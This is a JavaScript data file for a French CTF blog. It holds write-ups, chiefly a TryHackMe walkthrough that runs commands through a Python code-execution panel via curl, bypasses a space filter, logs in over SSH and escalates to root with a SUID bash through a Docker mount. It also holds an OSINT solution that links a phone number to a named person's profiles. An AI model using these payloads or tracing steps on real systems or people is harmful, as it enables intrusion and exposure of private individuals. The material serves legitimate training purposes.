// ============================================
// DATA.JS - Dynamic Content Management
// ============================================

const pageData = {
    home: {
        title: "Home",
        content: [
            {
                id: 0,
                icon: "🏆",
                title: "1ère Place - BJSEC Christmas CTF 2025",
                description: "Remportée avec 5160 points! Mon équipe (K1llTh3m, Gl0r14) a remporté cette compétition intense de 48h. Du 6ème au 1er en moins d'une heure avant la fin!",
                date: "Dec 27, 2025",
                link: "pages/bjsec-christmassctf.html"
            },
            {
                id: 1,
                icon: "🎄",
                title: "Writeup Complet - 'Le Cadeau' (BJSec CTF)",
                description: "Writeup complet du challenge 'Le Cadeau' de BJSec CTF - Forensics, Stéganographie, OSINT et Cryptographie. Flag: CM{Y0U_4R3_KIN9_Of_5T360$!N7_079@}",
                date: "Dec 27, 2026",
                link: "pages/writeup-osint.html"
            },
            {
                id: 2,
                icon: "⏱️",
                title: "Python Playground CTF - Write-up Complet",
                description: "Writeup complet du challenge Python Playground CTF - Exploitation RCE, décodage de hash personnalisé, et privilege escalation via Docker misconfiguration. 3 flags à obtenir.",
                date: "Oct 15, 2025",
                link: "pages/hackerlab-part1.html"
            },
            {
                id: 3,
                icon: "📰",
                title: "Présentation du Blog K1llTh3m",
                description: "Bienvenue sur mon blog dédié à la cybersécurité, aux CTF. Découvrez ma mission, la structure du blog, et mes objectifs de progression en cybersécurité.",
                date: "Sep 10, 2025",
                link: "pages/presentation.html"
            }
        ]
    },
    ctf: {
        title: "CTF - Cybersécurité & Challenges",
        isFullPage: true,
        content: []
    },
    machines: {
        title: "MACHINES",
        isFullPage: true,
        content: []
    },
    portfolio: {
        title: "PORTFOLIO - Profil Professionnel",
        isFullPage: true,
        content: []
    },
    categories: {
        title: "CATEGORIES",
        content: []
    }
};

// Post structure for full view
const fullPosts = {
    'bjsec-christmassctf': {
        title: "🏆 1ère Place - BJSEC Christmas CTF 2025 - Une Expérience Inoubliable!",
        icon: "🏆",
        date: "Dec 27, 2025",
        category: "Compétition CTF",
        difficulty: "Expert",
        content: `
            <h2>Je suis ravi d'annoncer que mon équipe a remporté la première place du BJSEC Christmas CTF 2024 avec 5160 points! 🎉</h2>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Un Parcours Intense et Inattendu</h3>
            <p>Cette compétition aura été <strong>la plus grande compétition de mon parcours CTF</strong> jusqu'à présent. Les 48 heures ont été <strong>intenses, exigeantes et révélatrices</strong>. J'ai vraiment veillé, et j'ai laissé plein de choses de côté juste pour me concentrer sur ce CTF. Cela en dit long sur mon engagement!</p>
            
            <p>Mais voici la partie la plus folle: <strong>j'étais très loin du podium à un moment</strong>, en 6ème position avec moins d'une heure avant la fin. Après les dernières releases de challenges et ma résolution de 3 challenges de plus, je me suis retrouvé en première position... ce que je n'espérais vraiment pas! 🤯</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Remerciements aux Organisateurs</h3>
            <p>Un immense merci aux administrateurs pour l'organisation impeccable de cette <strong>deuxième édition</strong>:</p>
            <ul>
                <li>Cyrille Kyrillos ASSOGBA</li>
                <li>Byylle ODOALEYKOUN</li>
                <li>Chamss-Dine Adedoyi AGBIZOUNON</li>
                <li>ANGE</li>
            </ul>
            <p>48 heures intenses, des challenges technique de haute qualité, et une compétition qui nous a vraiment poussés dans nos retranchements. Respect! 🙌</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>🎯 Mon Équipe</h2>
            <ul style="font-size: 16px; color: #ff006e; font-weight: bold;">
                <li>Junaïd Niktab LAWANI (K1llTh3m) - Moi-même</li>
                <li>Gloria TOUDONOU (Gl0r14)</li>
            </ul>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>💡 Les Challenges Qui M'Ont Marqué</h2>
            
            <h3>Catégories de Haut Niveau</h3>
            <p>Les catégories <strong>Fast and fuRIous</strong>, <strong>Application Security</strong> et <strong>Investigation</strong> ont été particulièrement enrichissantes. Ces épreuves m'ont notamment permis de me replonger dans le <strong>Web</strong>, une discipline que j'avais délaissée depuis un moment.</p>
            
            <h3>Apprentissage et Progression</h3>
            <p>Cette compétition a été <strong>révélatrice</strong>: elle m'a fait prendre conscience de mes axes d'amélioration, notamment en exploitation Web. Mais surtout, elle m'a <strong>redonné l'envie de renforcer ces compétences</strong>. C'est exactement ce genre d'événement qui nous fait progresser!</p>
            
            <p style="font-style: italic; color: #00d9ff; margin-top: 20px;">J'avais vraiment veillé, j'ai laissé plein de trucs juste pour ce CTF. La suite reste à venir. Cela m'a beaucoup appris. Ce que je n'espérais pas pour de vrai!</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h2>🔥 Conclusion</h2>
            <p>Un grand bravo à tous les participants et encore merci à <strong>#BJSEC</strong> pour cette organisation au top. Cette victoire n'est pas seulement un trophée, c'est une <strong>preuve de détermination, d'endurance et d'adaptabilité</strong>.</p>
            
            <p style="font-weight: bold; color: #ff006e; font-size: 16px;">Vivement la prochaine édition! 🚀</p>
            
            <h2>📊 Statistiques</h2>
            <ul>
                <li><strong>Place finale:</strong> 1ère 🥇</li>
                <li><strong>Points:</strong> 5160</li>
                <li><strong>Durée:</strong> 48 heures</li>
                <li><strong>Remontée:</strong> Du 6ème au 1ème en moins de 1h!</li>
                <li><strong>Challenges résolus:</strong> Multi-catégories</li>
            </ul>
            
            <p style="margin-top: 40px; padding-top: 20px; border-top: 1px solid rgba(255,0,110,0.3); font-size: 12px; color: #999;"><em>Dernière mise à jour: 18 Janvier 2026 | Event: BJSEC Christmas CTF 2025</em></p>
        `
    },
    'writeup-osint': {
        title: "🎄 Writeup Complet - 'Le Cadeau' (BJSec CTF)",
        icon: "🎄",
        date: "Dec 29, 2024",
        category: "OSINT / Forensics / Stéganographie",
        difficulty: "Medium/Hard",
        content: `
            <h2>📋 Informations du Challenge</h2>
            <ul>
                <li><strong>Nom:</strong> Le Cadeau</li>
                <li><strong>Catégorie:</strong> OSINT / Forensics / Stéganographie</li>
                <li><strong>Points:</strong> 500</li>
                <li><strong>Difficulté:</strong> Medium/Hard</li>
                <li><strong>Auteur:</strong> foundhack</li>
                <li><strong>Event:</strong> BJSec CTF (Bénin)</li>
            </ul>
            
            <h2>🎯 Objectif</h2>
            <p>Extraire un numéro de téléphone caché dans un fichier corrompu, identifier son propriétaire via OSINT sans le contacter, puis retrouver des fragments de flag dispersés sur différentes plateformes sociales.</p>
            
            <h2>🔍 Phase 1 : Forensics - Extraction du Numéro</h2>
            
            <h3>Étape 1 : Analyse Initiale du Fichier</h3>
            <pre><code>file challenge.bin
xxd challenge.bin | head -5</code></pre>
            <p><strong>Résultat:</strong></p>
            <pre><code>00000000: 474e 5089 0a1a 0a0d 0d00 0000 5244 4849  GNP.........RDHI
00000010: 0008 0000 5305 0000 0000 0208 5f08 d600  ....S......._....</code></pre>
            <p><strong>Analyse:</strong> Le fichier commence par <code>47 4E 50 89</code> ("GNP."), alors qu'un PNG valide devrait commencer par <code>89 50 4E 47</code> (".PNG").</p>
            <p><strong>Conclusion:</strong> Corruption par inversion de blocs de 4 bytes.</p>
            
            <h3>Étape 2 : Réparation du PNG</h3>
            <p>Script Python pour inverser les blocs de 4 bytes:</p>
            <pre><code>with open('challenge.bin', 'rb') as f:
    data = bytearray(f.read())

fixed = bytearray()
for i in range(0, len(data), 4):
    chunk = data[i:i+4]
    fixed.extend(chunk[::-1])

with open('fixed2.png', 'wb') as f:
    f.write(fixed)</code></pre>
            <p><strong>Vérification:</strong> <code>file fixed2.png</code> → PNG image data, 2048 x 1363, 8-bit/color RGB ✅</p>
            
            <h3>Étape 3 : Détection de Stéganographie</h3>
            <pre><code>exiftool fixed2.png</code></pre>
            <p><strong>Avertissement détecté:</strong> "Warning: [minor] Trailer data after PNG IEND chunk"</p>
            <p><strong>Signification:</strong> Des données cachées après la fin officielle du PNG (technique de stéganographie classique).</p>
            
            <h3>Étape 4 : Extraction de l'Image Cachée</h3>
            <pre><code>with open('fixed2.png', 'rb') as f:
    data = f.read()

iend_pos = data.find(b'IEND')
trailer_start = iend_pos + 8
hidden_png = data[trailer_start:]

with open('hidden.png', 'wb') as out:
    out.write(hidden_png)</code></pre>
            <p><strong>Vérification:</strong> PNG image data, 819 x 460, 8-bit/color RGB ✅</p>
            
            <h3>Étape 5 : Extraction du Numéro</h3>
            <p>En visualisant <code>hidden.png</code>, le numéro de téléphone apparaît:</p>
            <p><strong>Numéro trouvé: 0159165994</strong> ✅</p>
            
            <h2>🕵️ Phase 2 : OSINT - Identification de la Cible</h2>
            
            <h3>Étape 1 : Recherche sur Truecaller</h3>
            <p><strong>URL:</strong> https://www.truecaller.com</p>
            <ul>
                <li><strong>Nom:</strong> Chamss Deen Imi</li>
                <li><strong>Pays:</strong> Bénin 🇧🇯</li>
            </ul>
            
            <h3>Étape 2 : Enrichissement via LinkedIn</h3>
            <p><strong>Recherche:</strong> "Chamss Deen Imi" site:linkedin.com</p>
            <p><strong>Profil trouvé:</strong> Chamss-Dine Adedoyi AGBIZOUNON - Membre actif de la communauté tech locale</p>
            
            <h3>Étape 3 : Découverte du Pseudo</h3>
            <p>En analysant les publications de <strong>BJSec</strong> sur LinkedIn, on trouve des mentions:</p>
            <p><strong>Pseudo identifié: overhack</strong> ✅</p>
            
            <h2>🌐 Phase 3 : Énumération Multi-Plateforme</h2>
            
            <h3>Étape 1 : Identification des Plateformes Cibles</h3>
            <p>Pour un profil tech/cybersécurité:</p>
            <ul>
                <li><strong>Quora</strong> - Q&A techniques</li>
                <li><strong>Reddit</strong> - Forums spécialisés</li>
                <li><strong>Stack Overflow</strong> - Programmation</li>
                <li><strong>Mastodon</strong> - Réseau social décentralisé</li>
            </ul>
            
            <h3>Étape 2 : Recherche sur Quora</h3>
            <p><strong>URL:</strong> https://www.quora.com/profile/Overhack</p>
            <p><strong>⚠️ Point critique:</strong> Le site doit être en <strong>anglais</strong> pour obtenir le bon code!</p>
            <p><strong>Découverte:</strong> Post avec image du Père Noël</p>
            <p><strong>Code 1:</strong> <code>T2ZfNVQzNjAkIU43XzA3OUB9</code></p>
            <p><strong>Indice:</strong> "The elephant site I am here"</p>
            
            <h3>Étape 3 : Déchiffrage de l'Indice</h3>
            <p><strong>Recherche Google:</strong> "elephant site" "social network" → Mastodon!</p>
            <p><strong>Pourquoi "elephant"?</strong></p>
            <ul>
                <li>Le logo de Mastodon est un <strong>mammouth</strong> 🦣 (ancêtre de l'éléphant)</li>
                <li>Indice subtil faisant référence au logo de la plateforme</li>
                <li>Peut aussi faire référence au Parc de Pendjari (éléphants du Bénin)</li>
            </ul>
            
            <h3>Étape 4 : Recherche sur Mastodon</h3>
            <p><strong>URL:</strong> https://mastodon.social/@overhack</p>
            <p><strong>Découverte:</strong> Post avec image du Père Noël</p>
            <p><strong>Code 2:</strong> <code>43 4d 7b 59 30 55 5f 34 52 33 5f 4b 49 4e 39 5f</code> ✅</p>
            
            <h2>🔐 Phase 4 : Décodage et Reconstruction</h2>
            
            <h3>Étape 1 : Analyse des Encodages</h3>
            <table style="width:100%; border-collapse:collapse;">
                <tr style="background-color: rgba(255,0,110,0.1);">
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Source</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Code</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Encodage</strong></td>
                </tr>
                <tr>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Mastodon</td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><code>43 4d 7b 59...</code></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Hexadécimal</td>
                </tr>
                <tr>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Quora</td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><code>T2ZfNVQzNjAk...</code></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Base64</td>
                </tr>
            </table>
            
            <h3>Étape 2 : Décodage Hexadécimal (Mastodon)</h3>
            <pre><code>echo "43 4d 7b 59 30 55 5f 34 52 33 5f 4b 49 4e 39 5f" | xxd -r -p</code></pre>
            <p><strong>Résultat:</strong> <code>CM{Y0U_4R3_KIN9_</code></p>
            
            <h3>Étape 3 : Décodage Base64 (Quora)</h3>
            <pre><code>echo "T2ZfNVQzNjAkIU43XzA3OUB9" | base64 -d</code></pre>
            <p><strong>Résultat:</strong> <code>Of_5T360$!N7_079@}</code></p>
            
            <h3>Étape 4 : Assemblage du Flag</h3>
            <pre><code>Partie 1 (Mastodon): CM{Y0U_4R3_KIN9_
Partie 2 (Quora):    Of_5T360$!N7_079@}</code></pre>
            <p style="font-size: 18px; color: #ff006e; font-weight: bold;">FLAG FINAL: CM{Y0U_4R3_KIN9_Of_5T360$!N7_079@}</p>
            
            <h2>💡 Pièges et Points Clés</h2>
            
            <h3>Les Pièges du Challenge</h3>
            <ol>
                <li><strong>Corruption sophistiquée</strong> - Inversion par blocs de 4 bytes (pas byte-by-byte)</li>
                <li><strong>Double stéganographie</strong> - PNG caché dans PNG (après IEND)</li>
                <li><strong>Truecaller indispensable</strong> - Seul moyen de relier le numéro à une identité</li>
                <li><strong>Pseudo non évident</strong> - Trouvable uniquement via les posts BJSec</li>
                <li><strong>🚨 Piège critique Quora</strong> - Version FR donne code corrompu, <strong>seule version anglaise fonctionne</strong></li>
                <li><strong>Fragmentation multi-plateforme</strong> - Flag divisé sur deux réseaux différents</li>
                <li><strong>Indice à double sens</strong> - "Elephant site" = Parc du Bénin + Logo Mastodon</li>
                <li><strong>Mastodon moins connu</strong> - Nécessite recherche active</li>
            </ol>
            
            <h3>Compétences Testées</h3>
            <ul>
                <li>✅ <strong>Forensics:</strong> Analyse de corruption, réparation de structures</li>
                <li>✅ <strong>Stéganographie:</strong> Extraction de données cachées</li>
                <li>✅ <strong>OSINT:</strong> Traçage multi-plateforme, énumération systématique</li>
                <li>✅ <strong>Cryptographie:</strong> Décodage hex et Base64</li>
                <li>✅ <strong>Attention aux détails:</strong> Différences FR/EN, indices subtils</li>
            </ul>
            
            <h2>🎯 Conclusion</h2>
            <p>Ce challenge était une excellente introduction à l'OSINT réel, combinant habilement forensics technique, stéganographie classique, OSINT méthodique, énumération intelligente et cryptographie basique.</p>
            <p>Le flag <code>CM{Y0U_4R3_KIN9_Of_5T360$!N7_079@}</code> signifie probablement "You are King of Saint 360 In 7079", une référence culturelle au Bénin et au créateur du challenge.</p>
            
            <h2>🏆 Résultat Final</h2>
            <p><strong>Flag:</strong> <code style="color: #ff006e; font-weight: bold; font-size: 16px;">CM{Y0U_4R3_KIN9_Of_5T360$!N7_079@}</code></p>
            <p><strong>Writeup par:</strong> K1llTh3m<br>
            <strong>Date:</strong> 29 décembre 2024<br>
            <strong>Event:</strong> BJSec CTF 🇧🇯<br>
            <strong>Points:</strong> 500</p>
            
            <p style="font-style: italic; color: #999; margin-top: 30px;">Joyeux Noël et bravo à l'équipe BJSec pour ce challenge créatif! 🎄🔍</p>
        `
    },
    'presentation': {
        title: "Présentation du Blog K1llTh3m",
        icon: "📰",
        date: "Sep 10, 2025",
        category: "Blog & Cybersécurité",
        difficulty: "N/A",
        content: `
            <h2>Présentation du Blog K1llTh3m</h2>
            <p><strong>Par Junaïd Niktab LAWANI</strong><br>
            <em>Temps de lecture : 1 min</em></p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Bienvenue sur mon blog</h3>
            <p>Bienvenue sur mon blog dédié à la cybersécurité, aux CTF, et au HackerLab. Ce projet est né d'une double volonté :</p>
            
            <ol>
                <li><strong>Partager mes writeups</strong> de machines et challenges, dans le cadre de ma préparation à l'eJPT et autres certifications.</li>
                <li><strong>Transmettre mon expérience</strong> et ma motivation aux futurs participants du HackerLab, à travers des retours d'expérience et des conseils.</li>
            </ol>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Structure du blog</h3>
            <ul>
                <li><strong>CTF</strong> → introduction aux CTF et challenges</li>
                <li><strong>Machines</strong> → writeups complets et détaillés des machines que je résous</li>
                <li><strong>Portfolio</strong> → aperçu de mes projets et parcours professionnel</li>
                <li><strong>Événements</strong> → articles consacrés à la compétition :
                    <ul>
                        <li>Mon expérience personnelle</li>
                        <li>Conseils pratiques et techniques</li>
                        <li>Temps forts et moments marquants</li>
                    </ul>
                </li>
            </ul>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>GitHub & anciens writeups</h3>
            <p>J'ai conservé mes premiers pas dans la rédaction de writeups sur GitHub :</p>
            <p>👉 <a href="https://github.com/niktab121" target="_blank" style="color: #ff006e; text-decoration: none;">Writeup-CTF Repository</a></p>
            <p>Ces anciens contenus retracent mon évolution et peuvent servir de base d'entraînement à ceux qui souhaitent progresser dans les CTF ou se préparer aux certifications.</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Objectifs du blog</h3>
            <ul>
                <li>Documenter ma progression vers l'eJPT et d'autres certifications</li>
                <li>Partager mes méthodes et writeups pour créer une ressource utile à la communauté</li>
                <li>Inspirer et motiver les futurs participants du HackerLab, en montrant l'aspect humain de la compétition</li>
                <li>Construire un portfolio solide démontrant mon expertise en cybersécurité</li>
            </ul>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <h3>Mon Mission</h3>
            <p style="font-style: italic; color: #ccc;">Au-delà des simples writeups techniques, je crois en l'importance de partager le processus d'apprentissage, les erreurs commises, et les lessons learned. La cybersécurité est un domaine où la communauté, l'échange d'expériences, et la bienveillance sont essentiels pour progresser ensemble.</p>
            
            <hr style="border: none; border-top: 1px solid rgba(255,0,110,0.3); margin: 20px 0;">
            
            <p><strong>Merci pour votre visite et bonne lecture.</strong></p>
            
            <p style="margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,0,110,0.3); font-size: 12px; color: #999;"><em>Ce contenu est sous licence CC BY 4.0.</em></p>
        `
    },
    'hackerlab-part1': {
        title: "Python Playground CTF - Write-up Complet - THM",
        icon: "🐍",
        date: "Oct 15, 2025",
        category: "CTF / RCE / Docker",
        difficulty: "Medium",
        content: `
            <h2>🎯 Objectif</h2>
            <p>Obtenir 3 flags en exploitant une application web Python avec exécution de code arbitraire et une mauvaise configuration Docker.</p>
            
            <h2>🔍 Reconnaissance</h2>
            
            <h3>Scan initial</h3>
            <pre><code># Découverte du serveur web sur port 80
curl http://10.65.148.127/</code></pre>
            
            <h3>Découverte de la page admin</h3>
            <pre><code>curl http://10.65.148.127/admin.html > admin.html</code></pre>
            
            <h2>🚪 FLAG 1 - Exploitation du Python Playground</h2>
            
            <h3>Analyse du code JavaScript</h3>
            <p>En examinant <code>admin.html</code>, on découvre :</p>
            <ul>
                <li><strong>Username:</strong> <code>connor</code></li>
                <li><strong>Hash du password:</strong> <code>dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu</code></li>
                <li><strong>Panel secret:</strong> <code>super-secret-admin-testing-panel.html</code></li>
            </ul>
            
            <h3>Décodage du mot de passe</h3>
            <p>Le JavaScript utilise un double encodage personnalisé. Création du décodeur :</p>
            <pre><code>def text_to_array(txt):
    return [ord(i) - 97 for i in txt]

def array_to_string(arr):
    txt = ''
    for i in range(0, len(arr), 2):
        txt += chr(arr[i]*26 + arr[i+1])
    return txt

hash_str = "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
password = array_to_string(text_to_array(array_to_string(text_to_array(hash_str))))
print(f"Password: {password}")</code></pre>
            <p><strong>Résultat:</strong> <code>spaghetti1245</code></p>
            
            <h3>Exploitation du Python Playground</h3>
            <p>Le panel permet l'exécution de code Python mais filtre les espaces. Solution : utiliser des TABs (<code>%09</code> en URL encoding).</p>
            <pre><code>curl -X POST "http://10.65.148.127/super-secret-admin-testing-panel.html" \
  --data "code=import%09os;print(os.popen('cat%09/root/flag1.txt').read())"</code></pre>
            <p style="font-size: 18px; color: #ff006e; font-weight: bold;"><strong>FLAG 1:</strong> THM{7e0b5cf...}</p>
            
            <h2>🔑 FLAG 2 - Accès SSH</h2>
            
            <h3>Connexion SSH</h3>
            <p>Avec les credentials découverts :</p>
            <pre><code>ssh connor@10.65.148.127
# Password: spaghetti1245</code></pre>
            
            <h3>Récupération du flag</h3>
            <pre><code>cat ~/flag2.txt</code></pre>
            <p style="font-size: 18px; color: #ff006e; font-weight: bold;"><strong>FLAG 2:</strong> THM{69a36d6f...}</p>
            
            <h2>👑 FLAG 3 - Privilege Escalation via Docker</h2>
            
            <h3>Analyse de la vulnérabilité</h3>
            <ul>
                <li>Le Python Playground s'exécute dans un conteneur Docker en tant que <strong>root</strong></li>
                <li>Le répertoire <code>/var/log</code> de l'hôte est monté sur <code>/mnt/log</code> dans le conteneur</li>
                <li>Cette configuration permet une escalade de privilèges</li>
            </ul>
            
            <h3>Exploitation</h3>
            
            <p><strong>Étape 1 : Créer un dossier accessible depuis le conteneur</strong></p>
            <pre><code>curl -X POST "http://10.65.148.127/super-secret-admin-testing-panel.html" \
  --data "code=import%09os;os.makedirs('/mnt/log/privesc',exist_ok=True);os.chmod('/mnt/log/privesc',0o777)"</code></pre>
            
            <p><strong>Étape 2 : Copier bash (depuis SSH en tant que connor)</strong></p>
            <pre><code>cd /var/log/privesc
cp /bin/bash .</code></pre>
            
            <p><strong>Étape 3 : Définir le bit SUID via le conteneur Docker (root)</strong></p>
            <pre><code>curl -X POST "http://10.65.148.127/super-secret-admin-testing-panel.html" \
  --data "code=import%09os;os.chown('/mnt/log/privesc/bash',0,0);os.chmod('/mnt/log/privesc/bash',0o4755)"</code></pre>
            
            <p><strong>Étape 4 : Exécuter bash avec privilèges (depuis SSH)</strong></p>
            <pre><code>cd /var/log/privesc
ls -la bash  # Vérifier : -rwsr-xr-x 1 root root
./bash -p
id  # uid=1000(connor) euid=0(root)
cat /root/flag3.txt</code></pre>
            <p style="font-size: 18px; color: #ff006e; font-weight: bold;"><strong>FLAG 3:</strong> THM{be3adc69...}</p>
            
            <h2>🔐 Vulnérabilités exploitées</h2>
            
            <h3>1. Exécution de code arbitraire</h3>
            <ul>
                <li>Filtrage des espaces insuffisant (contourné avec TABs)</li>
                <li>Pas de sandboxing du code Python exécuté</li>
            </ul>
            
            <h3>2. Authentification faible</h3>
            <ul>
                <li>Hash client-side facilement décodable</li>
                <li>Pas de protection contre le bruteforce</li>
            </ul>
            
            <h3>3. Mauvaise configuration Docker</h3>
            <ul>
                <li>Conteneur exécuté en root</li>
                <li>Mount du système de fichiers hôte (<code>/var/log</code>)</li>
                <li>Permet la création de binaires SUID accessibles depuis l'hôte</li>
            </ul>
            
            <h2>🛡️ Recommandations de sécurité</h2>
            <ol>
                <li>Ne jamais exécuter de code utilisateur non sandboxé</li>
                <li>Implémenter une authentification serveur-side robuste</li>
                <li>Exécuter les conteneurs Docker avec un utilisateur non-privilégié</li>
                <li>Minimiser les volumes montés entre hôte et conteneur</li>
                <li>Utiliser des politiques de sécurité Docker (AppArmor, SELinux)</li>
                <li>Implémenter une whitelist stricte pour l'exécution de code</li>
            </ol>
            
            <h2>📊 Résumé des flags</h2>
            <table style="width:100%; border-collapse:collapse;">
                <tr style="background-color: rgba(255,0,110,0.1);">
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Flag</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Valeur</strong></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><strong>Méthode</strong></td>
                </tr>
                <tr>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">FLAG 1</td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><code>THM{7e0b5cf...}</code></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">RCE via Python Playground</td>
                </tr>
                <tr>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">FLAG 2</td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><code>THM{69a36d6f...}</code></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">SSH avec credentials décodés</td>
                </tr>
                <tr>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">FLAG 3</td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;"><code>THM{be3adc69...}</code></td>
                    <td style="border:1px solid rgba(255,0,110,0.3); padding:8px;">Privilege escalation via Docker</td>
                </tr>
            </table>
            
            <p style="margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,0,110,0.3);"><strong>Difficulté:</strong> Moyenne<br>
            <strong>Concepts clés:</strong> RCE, décodage de hash personnalisé, exploitation Docker, SUID privilege escalation</p>
        `
    },
    'ctf-stegano': {
        title: "Stegano - Image Forensics",
        icon: "🚩",
        date: "Dec 20, 2025",
        category: "CTF",
        difficulty: "Medium",
        content: `
            <h3>Introduction à la Stéganographie</h3>
            <p>La stéganographie est l'art de cacher de l'information dans d'autres données. Contrairement à la cryptographie, le but n'est pas de rendre le message inintelligible, mais invisible.</p>
            
            <h3>Outils Essentiels</h3>
            <pre><code># Installation des outils
sudo apt install steghide exiftool binwalk strings

# Utilisation de steghide
steghide extract -sf image.jpg -p password
steghide info image.jpg</code></pre>
            
            <h3>Techniques d'Extraction</h3>
            <p>Plusieurs approches permettent d'extraire les données cachées :</p>
            <ul>
                <li><strong>Steghide :</strong> Outil spécialisé dans la stéganographie</li>
                <li><strong>Exiftool :</strong> Extraction des métadonnées EXIF</li>
                <li><strong>Binwalk :</strong> Analyse des signatures de fichiers</li>
                <li><strong>Strings :</strong> Extraction des chaînes de caractères lisibles</li>
            </ul>
            
            <h3>Cas Pratique</h3>
            <pre><code>$ file challenge.jpg
challenge.jpg: JPEG image data

$ strings challenge.jpg | grep flag
flag{steg0_ch4ll3ng3}

$ exiftool challenge.jpg
Creator: Hidden message here!

$ binwalk challenge.jpg
[+] Found ZIP archive at offset 0x12345</code></pre>
            
            <h3>Conclusion</h3>
            <p>Maîtriser ces techniques est essentiel pour tout participant à des CTF ou en forensique numérique.</p>
        `
    },
    'ctf-guide': {
        title: "Guide Complet des CTF - Cybersécurité",
        icon: "🚩",
        date: "Jan 18, 2026",
        category: "CTF & Cybersécurité",
        difficulty: "Débutant",
        content: `
            <h3>Introduction - Qui suis-je ?</h3>
            <p>Je suis un CTF player passionné et j'évolue progressivement vers le pentesting et l'analyse de malware. Ce blog s'adresse à tous ceux intéressés par les CTF et la cybersécurité en général.</p>
            
            <h3>La Cybersécurité : Vue d'ensemble</h3>
            <p>La cybersécurité est un domaine vaste et fascinant. On la divise généralement en trois grands axes :</p>
            <ul>
                <li><strong>Red Team</strong> - Les attaquants éthiques</li>
                <li><strong>Blue Team</strong> - Les défenseurs</li>
                <li><strong>GRC</strong> - Gouvernance, Risques et Conformité</li>
            </ul>
            
            <h3>Red Team vs Blue Team</h3>
            <p><strong>Red Team :</strong> Testeurs d'intrusion qui simulent des attaques pour identifier les failles. Leur objectif : casser, contourner, trouver des accès cachés.</p>
            <p><strong>Blue Team :</strong> Les défenseurs qui protègent, enquêtent et renforcent la sécurité. C'est ici qu'on retrouve les SOC Analysts.</p>
            <p><strong>Conseil :</strong> Comprendre les deux approches est essentiel. Comme en médecine, on commence généraliste avant de se spécialiser.</p>
            
            <h3>Qu'est-ce qu'un CTF ?</h3>
            <p>Un CTF (Capture The Flag) est une compétition de hacking éthique où on résout des défis dans différentes catégories de cybersécurité.</p>
            <p><strong>Important :</strong> Les CTF ne sont que le début. Le monde réel du pentest et du Bug Bounty est plus complexe et rémunérateur, mais c'est une excellente base d'apprentissage.</p>
            
            <h3>Types de CTF</h3>
            <p><strong>Le Jeopardy :</strong> Format le plus courant avec plusieurs catégories :</p>
            <ul>
                <li>Web Security</li>
                <li>Forensics & Stéganographie</li>
                <li>Reverse Engineering</li>
                <li>Binary Exploitation (Pwn)</li>
                <li>OSINT (Intelligence d'Origine Source Ouverte)</li>
                <li>Cryptographie</li>
                <li>Programmation</li>
            </ul>
            <p><strong>Attack & Defense :</strong> Format où il faut attaquer ET défendre simultanément. Plus avancé.</p>
            
            <h3>Comment Choisir sa Spécialité ?</h3>
            <p><strong>Deux approches :</strong></p>
            <ul>
                <li>Selon vos objectifs (Red Team → Web, Pwn; Blue Team → Forensics, Crypto)</li>
                <li>En testant les catégories easy/medium et voyant ce qui vous passionne</li>
            </ul>
            <p><strong>Conseil :</strong> Spécialisez-vous dans 1-2 catégories mais restez polyvalent. En équipe, c'est un énorme avantage.</p>
            
            <h3>Les Bases pour Débuter</h3>
            <p>Avant tout, maîtrisez le shell avec les challenges <strong>Bandit</strong> d'OverTheWire, puis acquérez les notions fondamentales via <strong>Netacad</strong>.</p>
            
            <h3>Plateformes Essentielles</h3>
            <p><strong>Apprentissage & Pratique :</strong></p>
            <ul>
                <li>TryHackMe & Hack The Box - incontournables</li>
                <li>PortSwigger (Web) - excellente pour exceller en Web</li>
                <li>CryptoHack (Cryptographie)</li>
                <li>Pwn.college (Binary Exploitation)</li>
                <li>LetsDefend (Forensics)</li>
            </ul>
            <p><strong>CTF Réguliers :</strong></p>
            <ul>
                <li>PicoCTF</li>
                <li>Root-Me</li>
                <li>CTFlearn</li>
                <li>CTFtime (pour les compétitions internationales)</li>
            </ul>
            
            <h3>Certifications Recommandées</h3>
